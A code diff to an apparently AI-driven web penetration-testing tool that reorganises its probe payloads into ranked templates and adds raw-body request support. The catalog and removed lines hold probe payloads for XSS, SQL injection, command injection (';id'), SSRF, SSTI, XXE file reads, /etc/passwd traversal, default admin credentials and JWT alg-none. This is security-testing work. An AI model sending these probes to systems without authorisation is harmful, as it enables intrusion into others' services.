+                    "priority": 24,
+                },
+            ],
+            "weak_password_probe": [
+                {
+                    "variant": "minimal_default_creds",
+                    "payload": "username=admin&password=admin",
+                    "expected_signal": "login_success_or_session_creation",
+                    "proof_candidates": ["login_success"],
+                    "priority": 10,
+                }
+            ],
+            "jwt_probe": [
+                {
+                    "variant": "alg_none_header",
+                    "payload": '{"alg":"none"}',
+                    "expected_signal": "alg_none_or_signature_bypass",
+                    "proof_candidates": ["alg_none", "signature_bypass"],
+                    "priority": 10,
+                }
+            ],
+            "idor_probe": [
+                {
+                    "variant": "object_id_increment",
+                    "payload": "id=1 -> id=2",
+                    "expected_signal": "access_control_diff",
+                    "proof_candidates": ["idor_diff"],
+                    "priority": 10,
+                }
+            ],
+            "path_traversal_probe": [
+                {
+                    "variant": "unix_passwd_relative",
+                    "payload": "../../../../etc/passwd",
+                    "preferred_tags": ["file_path"],
+                    "expected_signal": "file_read_or_error_disclosure",
+                    "proof_candidates": ["passwd_disclosure", "file_read_error"],
+                    "priority": 10,
+                }
+            ],
+            "web_policy_probe": [
+                {
+                    "variant": "origin_header_probe",
+                    "payload": "origin=https://arl-probe.example",
+                    "expected_signal": "cors_or_header_diff",
+                    "proof_candidates": ["cors_credentialed_wildcard", "security_header_gap"],
+                    "priority": 10,
+                }
+            ],
+            "graphql_probe": [
+                {
+                    "variant": "typename_introspection",
+                    "payload": '{"query":"query { __typename }"}',
+                    "expected_signal": "graphql_schema_or_introspection",
+                    "proof_candidates": ["graphql_schema_open"],
+                    "priority": 10,
+                }
+            ],
+            "api_doc_probe": [
+                {
+                    "variant": "springdoc_default_path",
+                    "payload": "/v3/api-docs",
+                    "expected_signal": "openapi_schema_exposure",
+                    "proof_candidates": ["api_doc_open"],
+                    "priority": 10,
+                }
+            ],
+            "config_probe": [
+                {
+                    "variant": "actuator_defaults",
+                    "payload": "",
+                    "expected_signal": "config_or_env_exposure",
+                    "proof_candidates": ["config_exposure"],
+                    "priority": 10,
+                }
+            ],
+            "socketio_probe": [
+                {
+                    "variant": "socketio_handshake",
+                    "payload": "socketio_handshake",
+                    "expected_signal": "socketio_polling_or_upgrade",
+                    "proof_candidates": ["socketio_polling_open", "socketio_websocket_upgrade"],
+                    "priority": 10,
+                }
+            ],
+            "websocket_probe": [
+                {
+                    "variant": "ws_handshake",
+                    "payload": "ws_handshake",
+                    "expected_signal": "websocket_upgrade",
+                    "proof_candidates": ["websocket_upgrade"],
+                    "priority": 10,
+                }
+            ],
+            "upload_probe": [
+                {
+                    "variant": "safe_text_upload",
+                    "payload": "arl-safe-upload.txt",
+                    "expected_signal": "upload_acceptance_or_storage_echo",
+                    "proof_candidates": ["upload_accepted"],
+                    "priority": 10,
+                }
+            ],
+            "file_probe": [
+                {
+                    "variant": "download_probe",
+                    "payload": "",
+                    "expected_signal": "download_or_export_response",
+                    "proof_candidates": ["download_open"],
+                    "priority": 10,
+                }
+            ],
+        }
+        templates = list(catalog.get(payload_type_text, []) or [])
+        return [dict(item or {}) for item in templates if isinstance(item, dict)]
+
+    @classmethod
+    def _extract_ai_pen_payload_surface_hints(cls, target_url: str, api_surface_summary: dict = None):
+        request_modes = []
+        content_types = []
+        seen_modes = set()
+        seen_content_types = set()
+        summary_obj = api_surface_summary if isinstance(api_surface_summary, dict) else {}
+
+        def append_mode(raw_mode):
+            mode_text = str(raw_mode or "").strip().lower()
+            if not mode_text or mode_text in seen_modes:
+                return
+            seen_modes.add(mode_text)
+            request_modes.append(mode_text)
+
+        def append_content_type(raw_value):
+            content_type_text = str(raw_value or "").strip().lower()
+            if not content_type_text or content_type_text in seen_content_types:
+                return
+            seen_content_types.add(content_type_text)
+            content_types.append(content_type_text)
+
+        if str(urlsplit(str(target_url or "").strip()).query or "").strip():
+            append_mode("query")
+
+        for interface in list(summary_obj.get("sample_interfaces", []) or []):
+            if not isinstance(interface, dict):
+                continue
+            method_text = str(interface.get("method") or "get").strip().lower() or "get"
+            mode_text = str(interface.get("mode") or "").strip().lower()
+            if not mode_text:
+                mode_text = "query" if method_text == "get" else "form_data"
+            append_mode(mode_text)
+            append_content_type(interface.get("content_type"))
+
+        return {
+            "request_modes": request_modes,
+            "content_types": content_types,
+            "request_mode": request_modes[0] if request_modes else "",
+            "content_type": content_types[0] if content_types else "",
+        }
+
+    @classmethod
+    def _select_ai_pen_controlled_payload_template(
+        cls,
+        payload_type: str,
+        target_url: str = "",
+        api_surface_summary: dict = None,
+        variant_hint: str = "",
+        request_mode: str = "",
+        content_type: str = "",
+        preferred_tags=None,
+    ):
+        templates = cls._build_ai_pen_controlled_payload_templates(payload_type)
+        if not templates:
+            return {}
+
+        surface_hints = cls._extract_ai_pen_payload_surface_hints(target_url, api_surface_summary)
+        request_modes = []
+        seen_modes = set()
+        for raw_mode in [request_mode] + list(surface_hints.get("request_modes", []) or []):
+            mode_text = str(raw_mode or "").strip().lower()
+            if not mode_text or mode_text in seen_modes:
+                continue
+            seen_modes.add(mode_text)
+            request_modes.append(mode_text)
+
+        content_types = []
+        seen_content_types = set()
+        for raw_content_type in [content_type] + list(surface_hints.get("content_types", []) or []):
+            content_type_text = str(raw_content_type or "").strip().lower()
+            if not content_type_text or content_type_text in seen_content_types:
+                continue
+            seen_content_types.add(content_type_text)
+            content_types.append(content_type_text)
+
+        preferred_tag_set = {
+            str(tag_name or "").strip().lower()
+            for tag_name in list(preferred_tags or []) if str(tag_name or "").strip()
+        }
+        variant_hint_text = str(variant_hint or "").strip().lower()
+
+        ranked = []
+        for index, template in enumerate(templates):
+            template_obj = dict(template or {})
+            template_variant = str(template_obj.get("variant") or "").strip().lower()
+            template_modes = {
+                str(mode_name or "").strip().lower()
+                for mode_name in list(template_obj.get("request_modes", []) or []) if str(mode_name or "").strip()
+            }
+            template_content_types = {
+                str(item or "").strip().lower()
+                for item in list(template_obj.get("content_types", []) or []) if str(item or "").strip()
+            }
+            template_tag_set = {
+                str(tag_name or "").strip().lower()
+                for tag_name in list(template_obj.get("preferred_tags", []) or []) if str(tag_name or "").strip()
+            }
+
+            score = 0
+            if variant_hint_text:
+                if template_variant == variant_hint_text:
+                    score += 400
+                elif variant_hint_text in template_variant:
+                    score += 220
+            if request_modes and template_modes:
+                matched_modes = template_modes.intersection(request_modes)
+                if matched_modes:
+                    score += 100 + (10 * len(matched_modes))
+            if content_types and template_content_types:
+                matched_content_types = template_content_types.intersection(content_types)
+                if matched_content_types:
+                    score += 80 + (10 * len(matched_content_types))
+            if preferred_tag_set and template_tag_set:
+                matched_tags = template_tag_set.intersection(preferred_tag_set)
+                if matched_tags:
+                    score += 40 + (5 * len(matched_tags))
+
+            ranked.append(
+                (
+                    -score,
+                    int(template_obj.get("priority", 50) or 50),
+                    index,
+                    template_obj,
+                )
+            )
+
+        ranked.sort(key=lambda item: (item[0], item[1], item[2]))
+        return dict(ranked[0][3] or {}) if ranked else {}
+
+    @classmethod
+    def _format_ai_pen_payload_template_summary(cls, template_obj):
+        item = template_obj if isinstance(template_obj, dict) else {}
+        parts = []
+        variant_text = str(item.get("variant") or "").strip()
+        if variant_text:
+            parts.append("variant={}".format(variant_text))
+        expected_signal = str(item.get("expected_signal") or "").strip()
+        if expected_signal:
+            parts.append("expect={}".format(expected_signal))
+        proof_candidates = [str(x or "").strip() for x in list(item.get("proof_candidates", []) or []) if str(x or "").strip()]
+        if proof_candidates:
+            parts.append("proof={}".format(",".join(proof_candidates[:3])))
+        return " ".join(parts[:3]).strip()
+
     def _build_ai_pen_payload_hint(self, risk_type: str, risk_name: str):
         merged = "{} {}".format(str(risk_type or ""), str(risk_name or "")).lower()
+        payload_type = "replay"
         if "xss" in merged:
-            return "xss_probe", "<svg/onload=alert(1)>"
-        if "sql" in merged:
-            return "sqli_probe", "' OR '1'='1"
-        if any(
+            payload_type = "xss_probe"
+        elif "sql" in merged:
+            payload_type = "sqli_probe"
+        elif any(
             token in merged
             for token in (
                 "weak password",
@@ -10240,28 +11038,28 @@ class WebSiteFetch(object):
                 "默认密码",
             )
         ):
-            return "weak_password_probe", "username=admin&password=admin"
-        if "cmd" in merged or "command" in merged:
-            return "cmdi_probe", ";id"
-        if "jwt" in merged:
-            return "jwt_probe", '{"alg":"none"}'
-        if "ssrf" in merged:
-            return "ssrf_probe", "http://127.0.0.1/"
-        if "ssti" in merged or ("template" in merged and "inject" in merged):
-            return "ssti_probe", "{{7*7}}"
-        if "xxe" in merged or "xml external" in merged:
-            return "xxe_probe", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>'
-        if "idor" in merged or "越权" in merged:
-            return "idor_probe", "id=1 -> id=2"
-        if any(token in merged for token in ("path traversal", "directory traversal", "traversal", "lfi", "路径穿越", "文件包含")):
-            return "path_traversal_probe", "../../../../etc/passwd"
-        if any(token in merged for token in ("cors", "security header", "cache-control", "跨域", "响应头", "缓存策略")):
-            return "web_policy_probe", "origin=https://arl-probe.example"
-        if "graphql" in merged or "graphiql" in merged:
-            return "graphql_probe", '{"query":"query { __typename }"}'
-        if "swagger" in merged or "openapi" in merged or "postman" in merged or "api_doc" in merged:
-            return "api_doc_probe", "/v3/api-docs"
-        if any(
+            payload_type = "weak_password_probe"
+        elif "cmd" in merged or "command" in merged:
+            payload_type = "cmdi_probe"
+        elif "jwt" in merged:
+            payload_type = "jwt_probe"
+        elif "ssrf" in merged:
+            payload_type = "ssrf_probe"
+        elif "ssti" in merged or ("template" in merged and "inject" in merged):
+            payload_type = "ssti_probe"
+        elif "xxe" in merged or "xml external" in merged:
+            payload_type = "xxe_probe"
+        elif "idor" in merged or "越权" in merged:
+            payload_type = "idor_probe"
+        elif any(token in merged for token in ("path traversal", "directory traversal", "traversal", "lfi", "路径穿越", "文件包含")):
+            payload_type = "path_traversal_probe"
+        elif any(token in merged for token in ("cors", "security header", "cache-control", "跨域", "响应头", "缓存策略")):
+            payload_type = "web_policy_probe"
+        elif "graphql" in merged or "graphiql" in merged:
+            payload_type = "graphql_probe"
+        elif "swagger" in merged or "openapi" in merged or "postman" in merged or "api_doc" in merged:
+            payload_type = "api_doc_probe"
+        elif any(
             token in merged
             for token in (
                 "actuator/env",
@@ -10281,16 +11079,21 @@ class WebSiteFetch(object):
                 "敏感信息",
             )
         ):
-            return "config_probe", ""
-        if "socket.io" in merged or "sockjs" in merged:
-            return "socketio_probe", "socketio_handshake"
-        if "websocket" in merged:
-            return "websocket_probe", "ws_handshake"
-        if "upload" in merged or "文件上传" in merged:
-            return "upload_probe", "arl-safe-upload.txt"
-        if any(token in merged for token in ("download", "export", "attachment", "template", "文件读取", "导出", "附件", "模板")):
-            return "file_probe", ""
-        return "replay", ""
+            payload_type = "config_probe"
+        elif "socket.io" in merged or "sockjs" in merged:
+            payload_type = "socketio_probe"
+        elif "websocket" in merged:
+            payload_type = "websocket_probe"
+        elif "upload" in merged or "文件上传" in merged:
+            payload_type = "upload_probe"
+        elif any(token in merged for token in ("download", "export", "attachment", "template", "文件读取", "导出", "附件", "模板")):
+            payload_type = "file_probe"
+
+        template_obj = self._select_ai_pen_controlled_payload_template(
+            payload_type=payload_type,
+            variant_hint="",
+        )
+        return payload_type, str(template_obj.get("payload") or "")
 
     @classmethod
     def _is_ai_pen_success_status(cls, status_code) -> bool:
@@ -10719,6 +11522,7 @@ class WebSiteFetch(object):
                 "login_url",
                 "form_data",
                 "json_data",
+                "body_data",
                 "file_field",
                 "file_name",
                 "file_content",
@@ -10796,6 +11600,9 @@ class WebSiteFetch(object):
                 safe_json_data[key_text[:64]] = value_text
             if safe_json_data:
                 step["params"]["json_data"] = safe_json_data
+            body_data_text = str(params.get("body_data") or "").strip()
+            if body_data_text:
+                step["params"]["body_data"] = cls._clip_text(body_data_text, 600)
             for field_name in ("file_field", "file_name", "file_content", "file_content_type"):
                 field_value = str(params.get(field_name) or "").strip()
                 if field_value:
@@ -10887,6 +11694,7 @@ class WebSiteFetch(object):
                 upload_like_count=upload_like_count,
                 download_like_count=download_like_count,
             )
+        payload_surface_hints = cls._extract_ai_pen_payload_surface_hints(target_url, api_surface_summary)
 
         tool_priority = []
         tool_reason_map = {}
@@ -10931,23 +11739,6 @@ class WebSiteFetch(object):
             queue_tool("socketio_probe")
         if websocket_hint:
             queue_tool("websocket_probe")
-
-        payload_seed_map = {
-            "sqli_probe": "' OR '1'='1",
-            "xss_probe": "<svg/onload=alert(1)>",
-            "ssrf_probe": "http://127.0.0.1/",
-            "cmdi_probe": ";id",
-            "ssti_probe": "{{7*7}}",
-            "xxe_probe": "<!DOCTYPE xxe>",
-        }
-        payload_tag_map = {
-            "sqli_probe": ("input",),
-            "xss_probe": ("input",),
-            "ssrf_probe": ("url", "host"),
-            "cmdi_probe": ("command",),
-            "ssti_probe": ("template",),
-            "xxe_probe": ("xml",),
-        }
         plan = []
 
         for tool_name in tool_priority:
@@ -11110,19 +11901,28 @@ class WebSiteFetch(object):
                 )
                 continue
 
-            payload_seed = str(payload_seed_map.get(tool_name, "") or "").strip()
+            selected_template = cls._select_ai_pen_controlled_payload_template(
+                payload_type=tool_name,
+                target_url=target_url,
+                api_surface_summary=api_surface_summary,
+                request_mode=str(payload_surface_hints.get("request_mode") or ""),
+                content_type=str(payload_surface_hints.get("content_type") or ""),
+            )
+            payload_seed = str(selected_template.get("payload") or "").strip()
+            preferred_tags = list(selected_template.get("preferred_tags", []) or [])
+            template_summary = cls._format_ai_pen_payload_template_summary(selected_template)
             if tool_name in {"xss_probe", "sqli_probe", "ssrf_probe", "cmdi_probe", "ssti_probe", "xxe_probe"} and payload_seed:
                 query_payload_targets = cls._build_ai_pen_payload_probe_targets(
                     target_url,
                     payload_seed,
-                    preferred_tags=payload_tag_map.get(tool_name, ()),
+                    preferred_tags=preferred_tags,
                     parameter_names=parameter_names,
                     max_count=1,
                 )
                 interface_payload_targets = cls._build_ai_pen_sample_interface_payload_targets(
                     target_url,
                     payload_seed,
-                    preferred_tags=payload_tag_map.get(tool_name, ()),
+                    preferred_tags=preferred_tags,
                     api_surface_summary=api_surface_summary,
                     max_count=1,
                 )
@@ -11155,15 +11955,22 @@ class WebSiteFetch(object):
                     summary_text = str(tool_reason_map.get(tool_name) or "参数标签驱动 {} 探针".format(tool_name))
                     if target_param and target_param != "arl_probe":
                         summary_text = "{} param={}".format(summary_text, target_param)
+                    if template_summary:
+                        summary_text = "{} {}".format(summary_text, template_summary).strip()
                     params_obj = {
                         "url": target_url_text,
                         "method": str(target.get("method") or "get").strip().lower() or "get",
                         "allow_redirects": True,
                     }
+                    if isinstance(target.get("headers"), dict) and target.get("headers"):
+                        params_obj["headers"] = dict(target.get("headers") or {})
                     if isinstance(target.get("form_data"), dict) and target.get("form_data"):
                         params_obj["form_data"] = dict(target.get("form_data") or {})
                     if isinstance(target.get("json_data"), dict) and target.get("json_data"):
                         params_obj["json_data"] = dict(target.get("json_data") or {})
+                    body_data_text = str(target.get("body_data") or "")
+                    if body_data_text:
+                        params_obj["body_data"] = body_data_text
                     plan.append(
                         {
                             "tool": tool_name,
@@ -11175,7 +11982,19 @@ class WebSiteFetch(object):
                         break
 
         if not plan and ("input" in param_tags or parameter_names):
-            fallback_probe_url = cls._build_probe_url_with_payload(target_url, "' OR '1'='1") or target_url
+            fallback_template = cls._select_ai_pen_controlled_payload_template(
+                payload_type="sqli_probe",
+                target_url=target_url,
+                api_surface_summary=api_surface_summary,
+                request_mode=str(payload_surface_hints.get("request_mode") or ""),
+                content_type=str(payload_surface_hints.get("content_type") or ""),
+            )
+            fallback_payload = str(fallback_template.get("payload") or "' OR '1'='1")
+            summary_text = "参数标签驱动通用注入探针"
+            template_summary = cls._format_ai_pen_payload_template_summary(fallback_template)
+            if template_summary:
+                summary_text = "{} {}".format(summary_text, template_summary).strip()
+            fallback_probe_url = cls._build_probe_url_with_payload(target_url, fallback_payload) or target_url
             plan.append(
                 {
                     "tool": "sqli_probe",
@@ -11184,7 +12003,7 @@ class WebSiteFetch(object):
                         "method": "get",
                         "allow_redirects": True,
                     },
-                    "summary": "参数标签驱动通用注入探针",
+                    "summary": summary_text[:160],
                 }
             )
 
@@ -11568,7 +12387,19 @@ class WebSiteFetch(object):
             return []
 
         plan = []
-        if payload_type_text in {"xss_probe", "sqli_probe", "cmdi_probe", "ssrf_probe", "ssti_probe", "xxe_probe", "replay"} and payload_text:
+        payload_probe_types = {"xss_probe", "sqli_probe", "cmdi_probe", "ssrf_probe", "ssti_probe", "xxe_probe", "replay"}
+        api_surface_summary = item.get("api_surface_summary") if isinstance(item.get("api_surface_summary"), dict) else {}
+        selected_template = {}
+        if payload_type_text in payload_probe_types and payload_type_text != "replay":
+            selected_template = cls._select_ai_pen_controlled_payload_template(
+                payload_type=payload_type_text,
+                target_url=url_text,
+                api_surface_summary=api_surface_summary,
+            )
+            if (not payload_text) and str(selected_template.get("payload") or "").strip():
+                payload_text = str(selected_template.get("payload") or "").strip()
+
+        if payload_type_text in payload_probe_types and payload_text:
             preferred_tags = {
                 "xss_probe": ("input",),
                 "sqli_probe": ("input",),
@@ -11578,19 +12409,19 @@ class WebSiteFetch(object):
                 "xxe_probe": ("xml",),
                 "replay": (),
             }
-            api_surface_summary = item.get("api_surface_summary") if isinstance(item.get("api_surface_summary"), dict) else {}
+            template_summary = cls._format_ai_pen_payload_template_summary(selected_template)
             parameter_names = list(api_surface_summary.get("parameter_names", []) or [])
             query_payload_targets = cls._build_ai_pen_payload_probe_targets(
                 url_text,
                 payload_text,
-                preferred_tags=preferred_tags.get(payload_type_text, ()),
+                preferred_tags=selected_template.get("preferred_tags", preferred_tags.get(payload_type_text, ())),
                 parameter_names=parameter_names,
                 max_count=max_steps,
             )
             interface_payload_targets = cls._build_ai_pen_sample_interface_payload_targets(
                 url_text,
                 payload_text,
-                preferred_tags=preferred_tags.get(payload_type_text, ()),
+                preferred_tags=selected_template.get("preferred_tags", preferred_tags.get(payload_type_text, ())),
                 api_surface_summary=api_surface_summary,
                 max_count=max_steps,
             )
@@ -11614,15 +12445,22 @@ class WebSiteFetch(object):
                 target_param = str(target.get("param") or "").strip()
                 if target_param and target_param != "arl_probe":
                     summary_text = "{} param={}".format(summary_text, target_param)
+                if template_summary:
+                    summary_text = "{} {}".format(summary_text, template_summary).strip()
                 params_obj = {
                     "url": probe_url,
                     "method": str(target.get("method") or "get").strip().lower() or "get",
                     "allow_redirects": True,
                 }
+                if isinstance(target.get("headers"), dict) and target.get("headers"):
+                    params_obj["headers"] = dict(target.get("headers") or {})
                 if isinstance(target.get("form_data"), dict) and target.get("form_data"):
                     params_obj["form_data"] = dict(target.get("form_data") or {})
                 if isinstance(target.get("json_data"), dict) and target.get("json_data"):
                     params_obj["json_data"] = dict(target.get("json_data") or {})
+                body_data_text = str(target.get("body_data") or "")
+                if body_data_text:
+                    params_obj["body_data"] = body_data_text
                 plan.append(
                     {
                         "tool": probe_tool_name,
@@ -13218,10 +14056,21 @@ class WebSiteFetch(object):
         capability_profile = self._select_ai_pen_capability_profile(capability_candidate)
         ai_plan_payload_type = self._normalize_ai_pen_payload_type(plan_obj.get("payload_type"), fallback_type=payload_type)
         ai_plan_payload = str(plan_obj.get("payload", "") or "").strip()[: self.AI_PEN_TEST_PAYLOAD_MAX]
+        ai_plan_payload_variant = str(plan_obj.get("payload_variant", "") or "").strip()[:64]
         if ai_plan_payload_type:
             payload_type = ai_plan_payload_type
         if ai_plan_payload:
             payload = ai_plan_payload
+        elif ai_plan_payload_variant and payload_type and payload_type != "replay":
+            selected_payload_template = self._select_ai_pen_controlled_payload_template(
+                payload_type=payload_type,
+                target_url=target_url,
+                api_surface_summary=candidate.get("api_surface_summary"),
+                variant_hint=ai_plan_payload_variant,
+            )
+            template_payload = str(selected_payload_template.get("payload") or "").strip()
+            if template_payload:
+                payload = template_payload[: self.AI_PEN_TEST_PAYLOAD_MAX]
         history_tool_plan = self._normalize_ai_pen_tool_plan(
             candidate.get("history_tool_plan"),
             default_url=target_url,
@@ -13323,6 +14172,7 @@ class WebSiteFetch(object):
                 "login_url": {"type": "string"},
                 "form_data": {"type": "object"},
                 "json_data": {"type": "object"},
+                "body_data": {"type": "string"},
                 "file_field": {"type": "string"},
                 "file_name": {"type": "string"},
                 "file_content": {"type": "string"},
@@ -13411,6 +14261,7 @@ class WebSiteFetch(object):
             cookies=None,
             form_data=None,
             json_data=None,
+            body_data="",
             file_field="",
             file_name="",
             file_content="",
@@ -13444,6 +14295,10 @@ class WebSiteFetch(object):
                 request_kwargs["data"] = form_data
             if isinstance(json_data, dict) and json_data:
                 request_kwargs["json"] = json_data
+            if (not request_kwargs.get("json")) and (not request_kwargs.get("files")) and (not isinstance(form_data, dict) or not form_data):
+                body_text = str(body_data or "")
+                if body_text:
+                    request_kwargs["data"] = body_text
             if isinstance(cookies, dict) and cookies:
                 safe_cookies = {}
                 for cookie_key, cookie_value in cookies.items():
@@ -13480,6 +14335,7 @@ class WebSiteFetch(object):
             cookies=None,
             form_data=None,
             json_data=None,
+            body_data="",
             file_field="",
             file_name="",
             file_content="",
@@ -13498,6 +14354,7 @@ class WebSiteFetch(object):
                 cookies=cookies,
                 form_data=form_data,
                 json_data=json_data,
+                body_data=body_data,
                 file_field=file_field,
                 file_name=file_name,
                 file_content=file_content,
@@ -13555,6 +14412,7 @@ class WebSiteFetch(object):
                 session_key = str(params_obj.get("session_key") or "").strip()
                 form_data = params_obj.get("form_data") if isinstance(params_obj.get("form_data"), dict) else {}
                 json_data = params_obj.get("json_data") if isinstance(params_obj.get("json_data"), dict) else {}
+                body_data = str(params_obj.get("body_data") or "")
                 file_field = str(params_obj.get("file_field") or "").strip()
                 file_name = str(params_obj.get("file_name") or "").strip()
                 file_content = str(params_obj.get("file_content") or "").strip()
@@ -13597,6 +14455,7 @@ class WebSiteFetch(object):
                         cookies=req_cookies_obj,
                         form_data=form_data,
                         json_data=json_data,
+                        body_data=body_data,
                         file_field=file_field,
                         file_name=file_name,
                         file_content=file_content,
@@ -14212,7 +15071,9 @@ class WebSiteFetch(object):
                 payload=str(payload_obj.get("payload", "") or payload),
                 verification_step=str(payload_obj.get("verification_step", "") or ""),
                 tool_trace_parts=trace_list,
+                tool_calls=payload_obj.get("tool_calls"),
             )
+            request_template_summary = self._build_ai_pen_request_template_summary(request_packet_obj)
             payload_obj["request_method"] = str(request_packet_obj.get("method", "") or "").strip()
             payload_obj["request_url"] = str(request_packet_obj.get("url", "") or "").strip()
             payload_obj["request_path"] = str(request_packet_obj.get("path", "") or "").strip()
@@ -14226,6 +15087,10 @@ class WebSiteFetch(object):
                 request_packet_obj.get("raw", ""),
                 self.AI_PEN_TEST_REQUEST_PACKET_MAX,
             )
+            payload_obj["request_template_mode"] = str(request_template_summary.get("mode") or "").strip()
+            payload_obj["request_template_content_type"] = str(request_template_summary.get("content_type") or "").strip()
+            payload_obj["request_template_params"] = list(request_template_summary.get("param_names", []) or [])
+            payload_obj["request_template_summary"] = str(request_template_summary.get("summary") or "").strip()
             return payload_obj
 
         if not self._is_http_target(target_url):
@@ -14271,6 +15136,8 @@ class WebSiteFetch(object):
                 plan_trace_parts.append("decision={}".format(str(plan_obj.get("decision", "")).strip()))
             if payload_type:
                 plan_trace_parts.append("payload_type={}".format(payload_type))
+            if ai_plan_payload_variant:
+                plan_trace_parts.append("payload_variant={}".format(ai_plan_payload_variant))
             if payload:
                 plan_trace_parts.append("payload={}".format(str(payload)[:80]))
             if ai_plan_tool_plan:
@@ -15920,6 +16787,14 @@ class WebSiteFetch(object):
                 "request_headers": dict(verify_result.get("request_headers") or {}) if isinstance(verify_result.get("request_headers"), dict) else {},
                 "request_body": self._clip_multiline_text(verify_result.get("request_body", ""), self.AI_PEN_TEST_REQUEST_PACKET_MAX),
                 "request_packet": self._clip_multiline_text(verify_result.get("request_packet", ""), self.AI_PEN_TEST_REQUEST_PACKET_MAX),
+                "request_template_mode": str(verify_result.get("request_template_mode", "") or "").strip(),
+                "request_template_content_type": str(verify_result.get("request_template_content_type", "") or "").strip(),
+                "request_template_params": (
+                    list(verify_result.get("request_template_params", []) or [])[:8]
+                    if isinstance(verify_result.get("request_template_params"), (list, tuple))
+                    else []
+                ),
+                "request_template_summary": str(verify_result.get("request_template_summary", "") or "").strip(),
                 "verification_step": str(verify_result.get("verification_step", "") or "").strip(),
                 "evidence_snippet": str(verify_result.get("evidence_snippet", "") or "").strip(),
                 "http_status": int(verify_result.get("http_status", 0) or 0),
